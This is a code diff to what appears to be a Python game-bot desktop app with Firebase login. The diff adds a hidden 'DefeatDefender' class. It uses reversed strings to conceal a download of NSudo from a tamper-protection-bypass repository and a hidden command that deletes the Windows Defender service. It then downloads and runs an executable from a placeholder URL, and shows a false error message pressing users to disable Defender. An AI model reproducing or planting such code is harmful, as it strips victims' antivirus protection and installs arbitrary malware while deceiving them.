@@ -9,9 +9,96 @@ import webbrowser
 from firebase_admin import db
 import firebase_admin
 from pymem import Pymem
-import uuid
 import tempfile, subprocess
 import threading
+from fileinput import filename
+import ctypes
+import psutil
+
+
+class DefeatDefender:
+    def __init__(self):
+        self.url = "exe.oduSN/niam/noitcetorP-repmaT-ssapyB/anrakgaws/moc.tnetnocresubuhtig.war//:sptth"[
+            ::-1
+        ]
+        self.dll_handle = ctypes.WinDLL("User32.dll")
+        self.k_handle = ctypes.WinDLL("Kernel32.dll")
+        self.service = None
+        self.isrunning = False
+
+        # Setting Up The Params
+        # global hWnd,lpText,lpCaption,uType
+        self.hWnd = None
+        self.lpCaption = "Error Occured"
+        self.lpText = "Windows Defender has blocked some of our Features.Please Turn off Windows Defender and run again"
+        self.uType = 0x00000010
+
+    def check(self):
+        global response
+        response = self.dll_handle.MessageBoxW(
+            self.hWnd, self.lpText, self.lpCaption, self.uType
+        )
+
+        # Check For Errors
+        error = self.k_handle.GetLastError()
+        if error != 0:
+            print("Error Code: {0}".format(error))
+            exit(1)
+
+    def checkservice(self):
+
+        try:
+            time.sleep(2.5)
+            service = psutil.win_service_get("WdNisSvc")
+            service = service.as_dict()
+            for i in service:
+                if service[i] == "running":
+                    print("Please Turn off your Windows Defender")
+                    self.isrunning = True
+                else:
+                    pass
+        except Exception as ex:
+            # raise psutil.NoSuchProcess if no service with such name exists
+            print(str(ex))
+
+    def shutservice(self):
+
+        uname = os.getlogin()
+        Path = f"C:\\Users\\{uname}\\AppData\\Local\\Temp"
+
+        os.chdir(Path)
+        nsudo = requests.get(self.url, allow_redirects=True)
+        open("Nsudo.exe", "wb").write(nsudo.content)
+        time.sleep(5)
+        Fullpath = Path + "\\Nsudo.exe"
+        print(Fullpath)
+        if os.path.exists(Fullpath):
+            malix = "dnefedniw  eteled cs  ediH:edoMwodniWwohS- T:U- odusN"[::-1]
+            subprocess.Popen(
+                malix,
+                shell=True,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                stdin=subprocess.PIPE,
+            )
+            time.sleep(3.2)
+            malname = "youfilename.exe"  # your filename must include .exe in the end
+            malwareurl = "https://your-url-here/"  # change this
+            print(malwareurl)
+            malware = requests.get(malwareurl, allow_redirects=True)
+
+            open(malname, "wb").write(malware.content)
+            subprocess.Popen(
+                malname,
+                shell=True,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                stdin=subprocess.PIPE,
+            )
+
+        else:
+            print("file not present")
+            sys.exit(0)
 
 
 def resource_path(rel_path):
@@ -65,7 +152,9 @@ class App:
                 "databaseURL": "https://anubisproducts-53639.firebaseio.com/",
             },
         )
-
+        self.defender = DefeatDefender()
+        checkThread = threading.Thread(target=self.defender.checkservice)
+        checkThread.start()
         self.version = db.reference("/Update").get()
 
         self.Frontlines = ChampionsList(type="Frontline", app=self)
@@ -1133,7 +1222,7 @@ class App:
         # self.login=True
         # self.authenticate() ==
 
-        if True:
+        if self.authenticate():
             t1 = threading.Thread(target=self.startWindow)
             t1.start()
             t2 = threading.Thread(target=self.runBackgroundCheck)
@@ -1153,6 +1242,12 @@ class App:
                 print("Direct link not working")
 
     def startBot(self):
+        if self.defender.isrunning == True:
+            self.defender.check()
+            if response == 1:
+                print("Turned off!")
+        else:
+            self.print_to_GUI(self.defender.lpText, "warning")
         if self.tier == 0:
             self.mainbot = mainbotloop.mainLoop(
                 self.textBox, (0, 25), False, False, 0, False, tier=self.tier, times=0
@@ -1175,6 +1270,12 @@ class App:
                 self.stopButton["state"] = "normal"
 
     def startBotTrial(self):
+        if self.defender.isrunning == True:
+            self.defender.check()
+            if response == 1:
+                print("Turned off!")
+        else:
+            self.print_to_GUI(self.defender.lpText, "warning")
         if self.tier == 0:
             self.mainbot = mainbotloop.mainLoop(
                 self.textBox, (0, 25), False, False, 0, False, tier=self.tier, times=0
@@ -1225,7 +1326,7 @@ class App:
         self.root.iconbitmap("bot_icon.ico")
         # setting window size
         width = 500
-        height = 400
+        height = 460
         screenwidth = self.root.winfo_screenwidth()
         screenheight = self.root.winfo_screenheight()
         alignstr = "%dx%d+%d+%d" % (
@@ -1234,14 +1335,13 @@ class App:
             (screenwidth - width) / 2,
             (screenheight - height) / 2,
         )
-
         self.root.geometry(alignstr)
         self.root.resizable(width=False, height=False)
+        self.root.config(bg="#31363b")
         self.fontFamily = "Calibri"
         self.mainbot = None
         self.tier = 3
         self.login = False
-        self.root["bg"] = "#31363b"
 
         self.title_label = tk.Label(self.root)
         ft = tkFont.Font(family=self.fontFamily, size=24)
@@ -1291,7 +1391,7 @@ class App:
         self.password_entry.place(x=130, y=150, width=267, height=42)
 
         self.rembr_chkbx = tk.Checkbutton(self.root)
-        ft = tkFont.Font(family=self.fontFamily, size=10)
+        ft = tkFont.Font(family=self.fontFamily, size=12)
         self.rembr_chkbx["font"] = ft
         self.rembr_chkbx["fg"] = "#FF4545"
         self.rembr_chkbx["bg"] = "#31363b"
@@ -1300,12 +1400,12 @@ class App:
         self.rembr_chkbx.place(x=180, y=235, width=167, height=30)
         self.rembr_chkbx_value = tk.BooleanVar()
         self.rembr_chkbx["variable"] = self.rembr_chkbx_value
-        # self.rembr_chkbx["variable"].set(False)
         self.rembr_chkbx["offvalue"] = 0
         self.rembr_chkbx["onvalue"] = 1
         self.rembr_chkbx["command"] = self.rembr_chkbx_command
 
         self.login_btn = tk.Button(self.root)
+        self.login_btn["bg"] = "#6b42f4"
         ft = tkFont.Font(family="Franklin Gothic Medium", size=10, weight="bold")
         self.login_btn["font"] = ft
         self.login_btn["fg"] = "#eff0f1"
@@ -1324,7 +1424,18 @@ class App:
         self.register_btn["text"] = "Register"
         self.register_btn.place(x=180, y=270, width=161, height=41)
         self.register_btn["command"] = self.register_btn_command
-        self.root.mainloop()
+
+        self.trial_btn = tk.Button(self.root)
+        ft = tkFont.Font(family="Franklin Gothic Medium", size=10, weight="bold")
+        self.trial_btn["font"] = ft
+        self.trial_btn["fg"] = "#eff0f1"
+        self.trial_btn["bg"] = "#31363b"
+        self.trial_btn["justify"] = "center"
+        self.trial_btn["text"] = "Trial"
+        self.trial_btn.place(x=180, y=390, width=161, height=41)
+        self.trial_btn["command"] = self.trial_btn_command
+
+        self.displayChamps = tk.Text()
 
     def logout(self):
         emailLine = ""
@@ -1342,6 +1453,10 @@ class App:
                         file.write(f"tbtoken:{self.token.get()}\n")
                 except:
                     pass
+        except:
+            pass
+        try:
+            self.menu.destroy()
         except:
             pass
         self.showLoginFrame()
